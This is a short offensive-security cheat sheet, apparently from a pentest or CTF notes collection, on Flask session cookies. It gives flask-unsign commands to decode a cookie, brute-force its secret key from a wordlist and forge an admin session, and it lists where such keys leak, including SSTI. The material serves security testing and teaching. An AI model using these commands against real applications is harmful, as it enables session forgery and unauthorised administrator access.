# flask-unsign

Flask's default session cookie is **signed, not encrypted**: `session=eyJ...<payload>.<ts>.<sig>`.
Anyone can read it; only the `SECRET_KEY` holder can create valid ones.

```bash
pip install flask-unsign
flask-unsign --decode --cookie '<cookie>'                                  # read
flask-unsign --unsign --cookie '<cookie>' --wordlist wordlists/secrets/flask-secret-keys.txt --no-literal-eval
flask-unsign --sign --cookie "{'user':'admin','role':'admin'}" --secret '<key>'   # forge
```
Where the key leaks: `config.py.bak` ([backup-files](../02-info-leak/backup-files.md)), `/debug/env`,
`.git`, `{{ config }}` via SSTI, defaults like `secret`, `changeme`, `dev`.
